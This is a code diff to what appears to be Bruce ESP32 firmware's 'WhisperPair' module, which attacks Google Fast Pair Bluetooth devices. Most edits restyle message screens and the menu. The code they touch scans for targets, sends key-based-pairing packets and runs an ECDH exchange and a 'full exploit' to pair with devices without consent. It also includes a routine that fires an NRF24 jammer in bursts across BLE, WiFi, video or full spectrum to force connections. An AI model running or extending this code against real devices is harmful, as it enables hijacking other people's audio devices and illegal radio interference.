@@ -18,33 +18,93 @@ extern bool returnToMenu;
 AudioCommandService audioCmd;
 FastPairCrypto crypto;
 
-int8_t showAdaptiveMessage(const char* line1, const char* btn1 = "", const char* btn2 = "", const char* btn3 = "", uint16_t color = TFT_WHITE, bool showEscHint = true) {
+void showDeviceInfoScreen(const char* title, const std::vector<String>& lines, uint16_t bgColor = TFT_BLACK, uint16_t textColor = TFT_WHITE) {
+    tft.fillScreen(bgColor);
+    drawMainBorderWithTitle(title);
+    tft.setTextColor(textColor, bgColor);
+    
+    int yPos = 60;
+    int lineHeight = 20;
+    int maxLines = 8;
+    
+    for(int i = 0; i < min((int)lines.size(), maxLines); i++) {
+        tft.setCursor(20, yPos);
+        
+        String displayLine = lines[i];
+        if(displayLine.length() > 35) {
+            displayLine = displayLine.substring(0, 32) + "...";
+        }
+        
+        tft.print(displayLine);
+        yPos += lineHeight;
+    }
+    
+    tft.setCursor(20, 220);
+    tft.print("Press any key to continue...");
+    
+    while(true) {
+        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
+            delay(200);
+            return;
+        }
+        delay(50);
+    }
+}
+
+int8_t showAdaptiveMessage(const char* line1, const char* btn1 = "", const char* btn2 = "", const char* btn3 = "", uint16_t color = TFT_WHITE, bool showEscHint = true, bool autoProgress = false) {
     int buttonCount = 0;
     if(strlen(btn1) > 0) buttonCount++;
     if(strlen(btn2) > 0) buttonCount++;
     if(strlen(btn3) > 0) buttonCount++;
 
-    if(buttonCount == 0) {
+    if(buttonCount == 0 && autoProgress) {
+        tft.fillScreen(bruceConfig.bgColor);
         drawMainBorderWithTitle("MESSAGE");
-        tft.fillRect(20, 60, tftWidth - 40, 80, bruceConfig.bgColor);
         tft.setTextColor(color, bruceConfig.bgColor);
         tft.setCursor(20, 70);
-        tft.print(line1);
-
-        if(showEscHint) {
-            tft.setCursor(20, 120);
-            tft.print("Press ESC to exit");
+        
+        String lineStr = line1;
+        if(lineStr.length() > 30) {
+            tft.print(lineStr.substring(0, 30));
+            tft.setCursor(20, 95);
+            if(lineStr.length() > 60) {
+                tft.print(lineStr.substring(30, 60) + "...");
+            } else {
+                tft.print(lineStr.substring(30));
+            }
         } else {
-            tft.setCursor(20, 120);
-            tft.print("Press any key...");
+            tft.print(line1);
+        }
+        
+        delay(1500);
+        return 0;
+    }
+    
+    if(buttonCount == 0) {
+        tft.fillScreen(bruceConfig.bgColor);
+        drawMainBorderWithTitle("MESSAGE");
+        tft.fillRect(20, 60, tftWidth - 40, 100, bruceConfig.bgColor);
+        tft.setTextColor(color, bruceConfig.bgColor);
+        tft.setCursor(20, 70);
+        
+        String lineStr = line1;
+        if(lineStr.length() > 30) {
+            tft.print(lineStr.substring(0, 30));
+            tft.setCursor(20, 95);
+            if(lineStr.length() > 60) {
+                tft.print(lineStr.substring(30, 60) + "...");
+            } else {
+                tft.print(lineStr.substring(30));
+            }
+        } else {
+            tft.print(line1);
         }
 
+        tft.setCursor(20, 140);
+        tft.print("Press any key to continue...");
+
         while(true) {
-            if(check(EscPress)) {
-                delay(200);
-                return -1;
-            }
-            if(showEscHint == false && (check(SelPress) || check(PrevPress) || check(NextPress))) {
+            if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
                 delay(200);
                 return 0;
             }
@@ -61,26 +121,43 @@ int8_t showAdaptiveMessage(const char* line1, const char* btn1 = "", const char*
             }
         }
 
+        tft.fillScreen(bruceConfig.bgColor);
         drawMainBorderWithTitle("MESSAGE");
         tft.fillRect(20, 60, tftWidth - 40, 60, bruceConfig.bgColor);
         tft.setTextColor(color, bruceConfig.bgColor);
         tft.setCursor(20, 70);
-        tft.print(line1);
+        
+        String lineStr = line1;
+        if(lineStr.length() > 30) {
+            tft.print(lineStr.substring(0, 30));
+            if(lineStr.length() > 60) {
+                tft.setCursor(20, 95);
+                tft.print(lineStr.substring(30, 60) + "...");
+            }
+        } else {
+            tft.print(line1);
+        }
 
-        int btnWidth = 100;
+        String btnText = actualBtn;
+        if(btnText.length() > 12) {
+            btnText = btnText.substring(0, 9) + "...";
+        }
+        
+        int btnWidth = btnText.length() * 12 + 20;
+        if(btnWidth < 100) btnWidth = 100;
         int btnX = (tftWidth - btnWidth) / 2;
-        int btnY = 140;
+        int btnY = 150;
 
-        tft.fillRoundRect(btnX, btnY, btnWidth, 30, 5, bruceConfig.priColor);
+        tft.fillRoundRect(btnX, btnY, btnWidth, 35, 5, bruceConfig.priColor);
         tft.setTextColor(TFT_WHITE, bruceConfig.priColor);
-
-        int textWidth = strlen(actualBtn) * 6;
+        
+        int textWidth = btnText.length() * 6;
         int textX = btnX + (btnWidth - textWidth) / 2;
-        tft.setCursor(textX, btnY + 10);
-        tft.print(actualBtn);
+        tft.setCursor(textX, btnY + 12);
+        tft.print(btnText);
 
         tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-        tft.setCursor(20, 180);
+        tft.setCursor(20, 200);
         tft.print("SEL: Select  ESC: Cancel");
 
         while(true) {
@@ -97,6 +174,105 @@ int8_t showAdaptiveMessage(const char* line1, const char* btn1 = "", const char*
     }
     else {
         return displayMessage(line1, btn1, btn2, btn3, color);
+    }
+}
+
+void showWarningMessage(const char* message) {
+    tft.fillScreen(TFT_YELLOW);
+    drawMainBorderWithTitle("WARNING");
+    tft.setTextColor(TFT_BLACK, TFT_YELLOW);
+    
+    tft.fillRect(20, 60, tftWidth - 40, 100, TFT_YELLOW);
+    tft.setCursor(20, 70);
+    
+    String msgStr = message;
+    if(msgStr.length() > 30) {
+        tft.print(msgStr.substring(0, 30));
+        tft.setCursor(20, 95);
+        if(msgStr.length() > 60) {
+            tft.print(msgStr.substring(30, 60) + "...");
+        } else {
+            tft.print(msgStr.substring(30));
+        }
+    } else {
+        tft.print(message);
+    }
+    
+    tft.setCursor(20, 140);
+    tft.print("Press any key to continue...");
+    
+    while(true) {
+        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
+            delay(200);
+            return;
+        }
+        delay(50);
+    }
+}
+
+void showErrorMessage(const char* message) {
+    tft.fillScreen(TFT_RED);
+    drawMainBorderWithTitle("ERROR");
+    tft.setTextColor(TFT_WHITE, TFT_RED);
+    
+    tft.fillRect(20, 60, tftWidth - 40, 100, TFT_RED);
+    tft.setCursor(20, 70);
+    
+    String msgStr = message;
+    if(msgStr.length() > 30) {
+        tft.print(msgStr.substring(0, 30));
+        tft.setCursor(20, 95);
+        if(msgStr.length() > 60) {
+            tft.print(msgStr.substring(30, 60) + "...");
+        } else {
+            tft.print(msgStr.substring(30));
+        }
+    } else {
+        tft.print(message);
+    }
+    
+    tft.setCursor(20, 140);
+    tft.print("Press any key to continue...");
+    
+    while(true) {
+        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
+            delay(200);
+            return;
+        }
+        delay(50);
+    }
+}
+
+void showSuccessMessage(const char* message) {
+    tft.fillScreen(TFT_GREEN);
+    drawMainBorderWithTitle("SUCCESS");
+    tft.setTextColor(TFT_BLACK, TFT_GREEN);
+    
+    tft.fillRect(20, 60, tftWidth - 40, 100, TFT_GREEN);
+    tft.setCursor(20, 70);
+    
+    String msgStr = message;
+    if(msgStr.length() > 30) {
+        tft.print(msgStr.substring(0, 30));
+        tft.setCursor(20, 95);
+        if(msgStr.length() > 60) {
+            tft.print(msgStr.substring(30, 60) + "...");
+        } else {
+            tft.print(msgStr.substring(30));
+        }
+    } else {
+        tft.print(message);
+    }
+    
+    tft.setCursor(20, 140);
+    tft.print("Press any key to continue...");
+    
+    while(true) {
+        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
+            delay(200);
+            return;
+        }
+        delay(50);
     }
 }
 
@@ -118,12 +294,20 @@ bool requireSimpleConfirmation(const char* message) {
     tft.fillRect(20, 50, tftWidth - 40, 100, bruceConfig.bgColor);
     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
     tft.setCursor(20, 60);
-    tft.print(message);
-    tft.setCursor(20, 100);
-    tft.print("Press SEL to confirm");
-    tft.setCursor(20, 120);
-    tft.print("or ESC to cancel");
-
+    
+    String msgStr = message;
+    if(msgStr.length() > 30) {
+        tft.print(msgStr.substring(0, 30));
+        tft.setCursor(20, 85);
+        if(msgStr.length() > 60) {
+            tft.print(msgStr.substring(30, 60) + "...");
+        } else {
+            tft.print(msgStr.substring(30));
+        }
+    } else {
+        tft.print(message);
+    }
+    
     while(true) {
         if(check(EscPress)) {
             showAdaptiveMessage("Cancelled", "OK", "", "", TFT_WHITE);
@@ -138,34 +322,126 @@ bool requireSimpleConfirmation(const char* message) {
     }
 }
 
-bool attemptKeyBasedPairing(NimBLEAddress target) {
-    showAdaptiveMessage("Connecting to target...", "", "", "", TFT_WHITE, false);
+bool checkIfFastPairDevice(NimBLEAddress target) {
+    std::vector<String> debugLines;
+    debugLines.push_back("Checking device...");
 
     NimBLEClient* pClient = NimBLEDevice::createClient();
+    pClient->setConnectTimeout(5);
 
     if(!pClient->connect(target, true)) {
-        showAdaptiveMessage("Connection failed", "OK", "", "", TFT_RED);
+        debugLines.push_back("Connection failed!");
+        showDeviceInfoScreen("DEVICE CHECK", debugLines, TFT_RED, TFT_WHITE);
         NimBLEDevice::deleteClient(pClient);
         return false;
     }
 
-    showAdaptiveMessage("Connected, discovering...", "", "", "", TFT_WHITE, false);
+    debugLines.push_back("Connected successfully");
+    debugLines.push_back("Discovering services...");
+
+    std::vector<NimBLERemoteService*>* services = pClient->getServices(true);
+    
+    bool hasFastPair = false;
+    int serviceCount = 0;
+    
+    if(services) {
+        serviceCount = services->size();
+        debugLines.push_back("Found " + String(serviceCount) + " services:");
+        
+        for(int i = 0; i < min(6, (int)services->size()); i++) {
+            String uuid = services->at(i)->getUUID().toString().c_str();
+            debugLines.push_back("[" + String(i+1) + "] " + uuid);
+            
+            if(uuid.indexOf("fe2c") != -1 || uuid.indexOf("FE2C") != -1) {
+                hasFastPair = true;
+            }
+        }
+        
+        if(services->size() > 6) {
+            debugLines.push_back("... and " + String(services->size() - 6) + " more");
+        }
+    } else {
+        debugLines.push_back("No services found!");
+    }
+    
+    pClient->disconnect();
+    NimBLEDevice::deleteClient(pClient);
+    
+    if(hasFastPair) {
+        debugLines.push_back("");
+        debugLines.push_back("✓ FASTPAIR DEVICE DETECTED");
+        showDeviceInfoScreen("FASTPAIR DEVICE", debugLines, TFT_GREEN, TFT_BLACK);
+        return true;
+    } else {
+        debugLines.push_back("");
+        debugLines.push_back("✗ No FastPair service (FE2C)");
+        showDeviceInfoScreen("NOT FASTPAIR", debugLines, TFT_YELLOW, TFT_BLACK);
+        return false;
+    }
+}
+
+bool attemptKeyBasedPairing(NimBLEAddress target) {
+    std::vector<String> debugLines;
+    debugLines.push_back("Connecting to target...");
+
+    NimBLEClient* pClient = NimBLEDevice::createClient();
+    pClient->setConnectTimeout(8);
+
+    bool connected = pClient->connect(target, false);
+    if(!connected) {
+        debugLines.push_back("Direct connect failed");
+        debugLines.push_back("Trying auto-connect...");
+        delay(300);
+        connected = pClient->connect(target, true);
+    }
+
+    if(!connected) {
+        debugLines.push_back("Connection failed!");
+        debugLines.push_back("Device may be:");
+        debugLines.push_back("- Paired to another device");
+        debugLines.push_back("- Out of range");
+        debugLines.push_back("- Not connectable");
+        showDeviceInfoScreen("CONNECTION FAILED", debugLines, TFT_RED, TFT_WHITE);
+        NimBLEDevice::deleteClient(pClient);
+        return false;
+    }
+
+    debugLines.push_back("Connected!");
+    debugLines.push_back("Looking for FastPair service...");
 
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
     if(pService == nullptr) {
-        showAdaptiveMessage("Fast Pair service not found", "OK", "", "", TFT_YELLOW);
+        debugLines.push_back("FastPair service not found!");
+        debugLines.push_back("(UUID FE2C not available)");
+        
+        std::vector<NimBLERemoteService*>* services = pClient->getServices(false);
+        if(services && services->size() > 0) {
+            debugLines.push_back("Available services:");
+            for(int i = 0; i < min(4, (int)services->size()); i++) {
+                String uuid = (*services)[i]->getUUID().toString().c_str();
+                debugLines.push_back(uuid);
+            }
+        }
+        
+        showDeviceInfoScreen("NO FASTPAIR", debugLines, TFT_YELLOW, TFT_BLACK);
         pClient->disconnect();
         NimBLEDevice::deleteClient(pClient);
         return false;
     }
 
+    debugLines.push_back("FastPair service found!");
+    debugLines.push_back("Looking for KBP characteristic...");
+    showDeviceInfoScreen("TESTING", debugLines, bruceConfig.bgColor, TFT_WHITE);
+
     NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
     if(pChar == nullptr) {
-        showAdaptiveMessage("KBP char not found", "OK", "", "", TFT_YELLOW);
+        showWarningMessage("KBP char not found!");
         pClient->disconnect();
         NimBLEDevice::deleteClient(pClient);
         return false;
     }
+
+    showAdaptiveMessage("Sending test packet...", "", "", "", TFT_WHITE, false, true);
 
     uint8_t packet[16] = {0};
     packet[0] = 0x00;
@@ -180,10 +456,8 @@ bool attemptKeyBasedPairing(NimBLEAddress target) {
     memcpy(&packet[2], targetBytes, 6);
     esp_fill_random(&packet[8], 8);
 
-    showAdaptiveMessage("Sending test packet...", "", "", "", TFT_WHITE, false);
-
     if(pChar->writeValue(packet, 16, false)) {
-        showAdaptiveMessage("Packet sent, checking...", "", "", "", TFT_WHITE, false);
+        showAdaptiveMessage("Packet sent, checking...", "", "", "", TFT_WHITE, false, true);
         delay(100);
 
         bool vulnerable = pChar->canRead() || pChar->canNotify();
@@ -191,10 +465,10 @@ bool attemptKeyBasedPairing(NimBLEAddress target) {
         NimBLEDevice::deleteClient(pClient);
 
         if(vulnerable) {
-            showAdaptiveMessage("DEVICE VULNERABLE!", "OK", "", "", TFT_GREEN);
+            showSuccessMessage("DEVICE VULNERABLE!");
             return true;
         } else {
-            showAdaptiveMessage("No response - may be patched", "OK", "", "", TFT_YELLOW);
+            showWarningMessage("No response - may be patched");
             return false;
         }
     }
@@ -205,36 +479,40 @@ bool attemptKeyBasedPairing(NimBLEAddress target) {
 }
 
 bool fastpair_ecdh_key_exchange(NimBLEAddress target, uint8_t* shared_secret) {
-    showAdaptiveMessage("Connecting...", "", "", "", TFT_WHITE, false);
+    std::vector<String> debugLines;
+    debugLines.push_back("Connecting...");
 
     NimBLEClient* pClient = NimBLEDevice::createClient();
     if(!pClient->connect(target, true)) {
-        showAdaptiveMessage("Connect failed", "OK", "", "", TFT_RED);
+        debugLines.push_back("Connection failed!");
+        showDeviceInfoScreen("KEY EXCHANGE", debugLines, TFT_RED, TFT_WHITE);
         return false;
     }
 
-    showAdaptiveMessage("Connected, discovering...", "", "", "", TFT_WHITE, false);
+    debugLines.push_back("Connected!");
+    debugLines.push_back("Discovering services...");
+    showDeviceInfoScreen("KEY EXCHANGE", debugLines, bruceConfig.bgColor, TFT_WHITE);
 
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
     if(!pService) {
-        showAdaptiveMessage("No FastPair service", "OK", "", "", TFT_RED);
+        showErrorMessage("No FastPair service");
         pClient->disconnect();
         return false;
     }
 
     NimBLERemoteCharacteristic* pKeyChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
     if(!pKeyChar) {
-        showAdaptiveMessage("No KBP char", "OK", "", "", TFT_RED);
+        showErrorMessage("No KBP char");
         pClient->disconnect();
         return false;
     }
 
-    showAdaptiveMessage("Generating key...", "", "", "", TFT_WHITE, false);
+    showAdaptiveMessage("Generating key...", "", "", "", TFT_WHITE, false, true);
 
     uint8_t our_pubkey[65];
     size_t pub_len = 65;
     if(!crypto.generateKeyPair(our_pubkey, &pub_len)) {
-        showAdaptiveMessage("Key gen failed", "OK", "", "", TFT_RED);
+        showErrorMessage("Key gen failed");
         pClient->disconnect();
         return false;
     }
@@ -244,27 +522,27 @@ bool fastpair_ecdh_key_exchange(NimBLEAddress target, uint8_t* shared_secret) {
     keyExchangeMsg[1] = 0x20;
     memcpy(&keyExchangeMsg[2], our_pubkey, 65);
 
-    showAdaptiveMessage("Sending key...", "", "", "", TFT_WHITE, false);
+    showAdaptiveMessage("Sending key...", "", "", "", TFT_WHITE, false, true);
 
     if(!pKeyChar->writeValue(keyExchangeMsg, 67, false)) {
-        showAdaptiveMessage("Send failed", "OK", "", "", TFT_RED);
+        showErrorMessage("Send failed");
         pClient->disconnect();
         return false;
     }
 
     delay(100);
-    showAdaptiveMessage("Waiting response...", "", "", "", TFT_WHITE, false);
+    showAdaptiveMessage("Waiting response...", "", "", "", TFT_WHITE, false, true);
 
     std::string response = pKeyChar->readValue();
     if(response.length() < 67) {
-        showAdaptiveMessage("Bad response", "OK", "", "", TFT_RED);
+        showErrorMessage("Bad response");
         pClient->disconnect();
         return false;
     }
 
     const uint8_t* their_pubkey = (const uint8_t*)response.c_str() + 2;
     if(!crypto.computeSharedSecret(their_pubkey, 65)) {
-        showAdaptiveMessage("Shared secret failed", "OK", "", "", TFT_RED);
+        showErrorMessage("Shared secret failed");
         pClient->disconnect();
         return false;
     }
@@ -275,6 +553,8 @@ bool fastpair_ecdh_key_exchange(NimBLEAddress target, uint8_t* shared_secret) {
 }
 
 bool fastpair_complete_pairing(NimBLEAddress target, const uint8_t* shared_secret) {
+    showAdaptiveMessage("Completing pairing...", "", "", "", TFT_WHITE, false, true);
+    
     NimBLEClient* pClient = NimBLEDevice::createClient();
     if(!pClient->connect(target, true)) return false;
 
@@ -350,7 +630,7 @@ String selectTargetFromScan(const char* title) {
     if (!pBLEScan) {
         tft.setTextColor(TFT_RED, bruceConfig.bgColor);
         tft.print("BLE INIT FAIL");
-        showAdaptiveMessage("Scanner init failed", "OK", "", "", TFT_RED);
+        showErrorMessage("Scanner init failed");
         return "";
     }
     
@@ -437,7 +717,7 @@ String selectTargetFromScan(const char* title) {
     delay(1500);
     
     if (devices.empty()) {
-        showAdaptiveMessage("NO DEVICES FOUND", "OK", "", "", TFT_YELLOW);
+        showWarningMessage("NO DEVICES FOUND");
         delay(1500);
         return "";
     }
@@ -521,7 +801,7 @@ String selectTargetFromScan(const char* title) {
         }
         
         if(millis() - inputWaitStart >= 30000) {
-            showAdaptiveMessage("Selection timeout", "OK", "", "", TFT_YELLOW);
+            showWarningMessage("Selection timeout");
             break;
         }
     }
@@ -543,7 +823,7 @@ void testFastPairVulnerability() {
     
     int colonPos = selectedInfo.lastIndexOf(':');
     if(colonPos == -1) {
-        showAdaptiveMessage("Invalid device info", "OK", "", "", TFT_RED);
+        showErrorMessage("Invalid device info");
         return;
     }
     
@@ -554,7 +834,7 @@ void testFastPairVulnerability() {
     try {
         target = NimBLEAddress(selectedMAC.c_str(), addrType);
     } catch (...) {
-        showAdaptiveMessage("Invalid MAC address", "OK", "", "", TFT_RED);
+        showErrorMessage("Invalid MAC address");
         return;
     }
     
@@ -590,7 +870,7 @@ bool runExploitOnConnectedDevice(NimBLEClient* pClient, NimBLEAddress target) {
         bool vulnerable = pChar->canRead() || pChar->canNotify();
         
         if(vulnerable) {
-            showAdaptiveMessage("EXPLOIT SUCCESS!", "Vulnerable device", "", "", TFT_GREEN);
+            showSuccessMessage("EXPLOIT SUCCESS!");
             return true;
         }
     }
@@ -599,7 +879,7 @@ bool runExploitOnConnectedDevice(NimBLEClient* pClient, NimBLEAddress target) {
 
 void aggressiveJamAndExploit(NimBLEAddress target) {
     if(isNRF24Available()) {
-        showAdaptiveMessage("Aggressive Signal Attack", "Multiple disruption bursts", "", "", TFT_YELLOW, false);
+        showAdaptiveMessage("Aggressive Signal Attack", "Multiple disruption bursts", "", "", TFT_WHITE, false, true);
         
         for(int i = 0; i < 3; i++) {
             startJammer();
@@ -607,13 +887,13 @@ void aggressiveJamAndExploit(NimBLEAddress target) {
             stopJammer();
             delay(200);
             
-            showAdaptiveMessage(("Burst " + String(i+1) + "/3").c_str(), "Attempting connection...", "", "", TFT_YELLOW, false);
+            showAdaptiveMessage(("Burst " + String(i+1) + "/3").c_str(), "Attempting connection...", "", "", TFT_WHITE, false, true);
             
             NimBLEClient* pClient = NimBLEDevice::createClient();
             pClient->setConnectTimeout(2);
             
             if(pClient->connect(target, false)) {
-                showAdaptiveMessage(("Connected on burst " + String(i+1)).c_str(), "Running exploit...", "", "", TFT_WHITE, false);
+                showAdaptiveMessage(("Connected on burst " + String(i+1)).c_str(), "Running exploit...", "", "", TFT_WHITE, false, true);
                 
                 if(runExploitOnConnectedDevice(pClient, target)) {
                     NimBLEDevice::deleteClient(pClient);
@@ -625,17 +905,17 @@ void aggressiveJamAndExploit(NimBLEAddress target) {
         }
     }
     
-    showAdaptiveMessage("Fallback: Direct attempt", "", "", "", TFT_YELLOW, false);
+    showAdaptiveMessage("Fallback: Direct attempt", "", "", "", TFT_WHITE, false, true);
     
     NimBLEClient* pClient = NimBLEDevice::createClient();
     pClient->setConnectTimeout(5);
     
     if(pClient->connect(target, false)) {
-        showAdaptiveMessage("Direct connection", "Running exploit...", "", "", TFT_WHITE, false);
+        showAdaptiveMessage("Direct connection", "Running exploit...", "", "", TFT_WHITE, false, true);
         runExploitOnConnectedDevice(pClient, target);
         pClient->disconnect();
     } else {
-        showAdaptiveMessage("Connection failed", "Device may be", "connected elsewhere", "OK", TFT_RED);
+        showErrorMessage("Connection failed");
     }
     
     NimBLEDevice::deleteClient(pClient);
@@ -667,18 +947,6 @@ void jamAndConnectMenu() {
         }
     }
     
-    const char* jamModeNames[] = {
-        "BLE Adv Only",
-        "All BLE Channels",
-        "BLE Adv Priority",
-        "Bluetooth All",
-        "WiFi",
-        "USB",
-        "Video",
-        "RC",
-        "Full Spectrum"
-    };
-    
     std::vector<Option> jamOptions;
     
     jamOptions.push_back({"[Scan then Jam Connect]", [&]() {
@@ -691,8 +959,21 @@ void jamAndConnectMenu() {
         NimBLEAddress target(selectedMAC.c_str(), addrType);
         
         if(requireSimpleConfirmation("Jam while connecting?")) {
-            showAdaptiveMessage(("Jamming: " + String(jamModeNames[getCurrentJammerMode()])).c_str(), 
-                               "Attempting connection...", "", "", TFT_YELLOW, false);
+            const char* jamModeNames[] = {
+                "BLE Adv Only", "All BLE Channels", "BLE Adv Priority", 
+                "Bluetooth All", "WiFi", "USB", "Video", "RC", "Full Spectrum"
+            };
+            
+            String jamMode = jamModeNames[getCurrentJammerMode()];
+            if(jamMode.length() > 20) {
+                jamMode = jamMode.substring(0, 17) + "...";
+            }
+            
+            std::vector<String> jamLines;
+            jamLines.push_back("Jamming mode: " + jamMode);
+            jamLines.push_back("Attempting connection...");
+            jamLines.push_back("This may take 5 seconds");
+            showDeviceInfoScreen("JAM & CONNECT", jamLines, TFT_YELLOW, TFT_BLACK);
             
             startJammer();
             
@@ -706,7 +987,7 @@ void jamAndConnectMenu() {
                 
                 if(pClient->connect(target, false)) {
                     connected = true;
-                    showAdaptiveMessage("Connected!", "Running exploit...", "", "", TFT_WHITE, false);
+                    showAdaptiveMessage("Connected!", "Running exploit...", "", "", TFT_WHITE, false, true);
                     runExploitOnConnectedDevice(pClient, target);
                     pClient->disconnect();
                     break;
@@ -715,7 +996,13 @@ void jamAndConnectMenu() {
             }
             
             if(!connected) {
-                showAdaptiveMessage("Connection failed", "Device may be paired", "or out of range", "OK", TFT_RED);
+                std::vector<String> failLines;
+                failLines.push_back("Connection failed!");
+                failLines.push_back("Possible reasons:");
+                failLines.push_back("- Device is already paired");
+                failLines.push_back("- Out of range");
+                failLines.push_back("- Not connectable");
+                showDeviceInfoScreen("FAILED", failLines, TFT_RED, TFT_WHITE);
             }
             
             stopJammer();
@@ -735,7 +1022,7 @@ void jamAndConnectMenu() {
         try {
             target = NimBLEAddress(selectedMAC.c_str(), addrType);
         } catch (...) {
-            showAdaptiveMessage("Invalid MAC address", "OK", "", "", TFT_RED);
+            showErrorMessage("Invalid MAC address");
             return;
         }
         
@@ -746,73 +1033,80 @@ void jamAndConnectMenu() {
     
     jamOptions.push_back({"[Set Jammer Mode]", [&]() {
         const char* jamModeNames[] = {
-            "BLE Adv Only",
-            "All BLE Channels",
-            "BLE Adv Priority",
-            "Bluetooth All",
-            "WiFi",
-            "USB",
-            "Video",
-            "RC",
-            "Full Spectrum"
+            "BLE Adv Only", "All BLE Channels", "BLE Adv Priority", 
+            "Bluetooth All", "WiFi", "USB", "Video", "RC", "Full Spectrum"
         };
         
-        int selection = getCurrentJammerMode();
-        bool redraw = true;
+        const int visibleItems = 4;
+        int selectedIdx = getCurrentJammerMode();
+        int scrollOffset = 0;
         
         while(true) {
-            if(redraw) {
-                tft.fillScreen(bruceConfig.bgColor);
-                drawMainBorderWithTitle("SET JAMMER MODE");
-                tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+            tft.fillScreen(bruceConfig.bgColor);
+            drawMainBorderWithTitle("SET JAMMER MODE");
+            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+            
+            int yPos = 60;
+            for(int i = 0; i < visibleItems; i++) {
+                int itemIdx = scrollOffset + i;
+                if(itemIdx >= 9) break;
                 
-                int yPos = 60;
-                for(int i = 0; i < 9; i++) {
-                    if(i == selection) {
-                        tft.setTextColor(TFT_BLACK, TFT_WHITE);
-                        tft.fillRect(20, yPos, tftWidth - 40, 25, TFT_WHITE);
-                    } else {
-                        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-                    }
-                    
-                    tft.setCursor(25, yPos + 7);
-                    tft.print(jamModeNames[i]);
-                    yPos += 28;
+                if(itemIdx == selectedIdx) {
+                    tft.setTextColor(TFT_BLACK, TFT_WHITE);
+                    tft.fillRect(20, yPos, tftWidth - 40, 25, TFT_WHITE);
+                } else {
+                    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
                 }
                 
-                tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-                tft.setCursor(20, 280);
-                tft.print("UP/DOWN: Select  SEL: Choose  ESC: Back");
-                
-                redraw = false;
+                tft.setCursor(25, yPos + 7);
+                tft.print(jamModeNames[itemIdx]);
+                yPos += 28;
+            }
+            
+            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+            tft.setCursor(20, 200);
+            tft.print("UP/DOWN: Scroll  SEL: Choose");
+            tft.setCursor(20, 220);
+            tft.print("ESC: Back");
+            
+            if(check(EscPress)) {
+                delay(200);
+                return;
             }
             
             if(check(PrevPress)) {
-                if(selection > 0) {
-                    selection--;
-                    redraw = true;
+                if(selectedIdx > 0) {
+                    selectedIdx--;
+                    if(selectedIdx < scrollOffset) {
+                        scrollOffset = selectedIdx;
+                    }
+                } else {
+                    selectedIdx = 8;
+                    scrollOffset = max(0, 8 - visibleItems + 1);
                 }
                 delay(200);
             }
             
             if(check(NextPress)) {
-                if(selection < 8) {
-                    selection++;
-                    redraw = true;
+                if(selectedIdx < 8) {
+                    selectedIdx++;
+                    if(selectedIdx >= scrollOffset + visibleItems) {
+                        scrollOffset = selectedIdx - visibleItems + 1;
+                    }
+                } else {
+                    selectedIdx = 0;
+                    scrollOffset = 0;
                 }
                 delay(200);
             }
             
             if(check(SelPress)) {
-                setJammerMode(selection);
-                showAdaptiveMessage(("Jam mode set to: " + String(jamModeNames[selection])).c_str(), 
-                                   "OK", "", "", TFT_GREEN);
+                setJammerMode(selectedIdx);
+                std::vector<String> confirmLines;
+                confirmLines.push_back("Jammer mode set to:");
+                confirmLines.push_back(jamModeNames[selectedIdx]);
+                showDeviceInfoScreen("MODE SET", confirmLines, TFT_GREEN, TFT_BLACK);
                 delay(1000);
-                return;
-            }
-            
-            if(check(EscPress)) {
-                delay(200);
                 return;
             }
             
@@ -831,6 +1125,30 @@ void whisperPairMenu() {
 
     options.push_back({"[Scan & Test]", []() {
         testFastPairVulnerability();
+    }});
+
+    options.push_back({"[Check Device]", []() {
+        String selectedInfo = selectTargetFromScan("CHECK DEVICE");
+        if(selectedInfo.isEmpty()) return;
+        
+        int colonPos = selectedInfo.lastIndexOf(':');
+        if(colonPos == -1) {
+            showErrorMessage("Invalid device info");
+            return;
+        }
+        
+        String selectedMAC = selectedInfo.substring(0, colonPos);
+        uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();
+        
+        NimBLEAddress target;
+        try {
+            target = NimBLEAddress(selectedMAC.c_str(), addrType);
+        } catch (...) {
+            showErrorMessage("Invalid MAC address");
+            return;
+        }
+        
+        checkIfFastPairDevice(target);
     }});
 
     options.push_back({"[Full Pair Test]", []() {
@@ -860,12 +1178,8 @@ void whisperPairMenu() {
         tft.print("4. Store account key");
 
         tft.fillRect(20, startY + (lineHeight * 5) + 10, tftWidth - 40, 30, bruceConfig.bgColor);
-        String prompt = "Press SEL to continue - ESC to cancel";
-        int textWidth = prompt.length() * 6;
-        int centerX = (tftWidth - textWidth) / 2;
-        if (centerX < 20) centerX = 20;
-        tft.setCursor(centerX, startY + (lineHeight * 5) + 10);
-        tft.print(prompt);
+        tft.setCursor(20, startY + (lineHeight * 5) + 10);
+        tft.print("SEL: Continue  ESC: Cancel");
 
         while(true) {
             if(check(EscPress)) return;
@@ -878,7 +1192,7 @@ void whisperPairMenu() {
 
         int colonPos = selectedInfo.lastIndexOf(':');
         if(colonPos == -1) {
-            showAdaptiveMessage("Invalid device info", "OK", "", "", TFT_RED);
+            showErrorMessage("Invalid device info");
             return;
         }
 
@@ -889,7 +1203,7 @@ void whisperPairMenu() {
         try {
             target = NimBLEAddress(selectedMAC.c_str(), addrType);
         } catch (...) {
-            showAdaptiveMessage("Invalid MAC address", "OK", "", "", TFT_RED);
+            showErrorMessage("Invalid MAC address");
             return;
         }
 
@@ -898,9 +1212,9 @@ void whisperPairMenu() {
 
         bool success = whisperPairFullExploit(target);
         if(success) {
-            showAdaptiveMessage("EXPLOIT SUCCESSFUL!", "OK", "", "", TFT_GREEN);
+            showSuccessMessage("EXPLOIT SUCCESSFUL!");
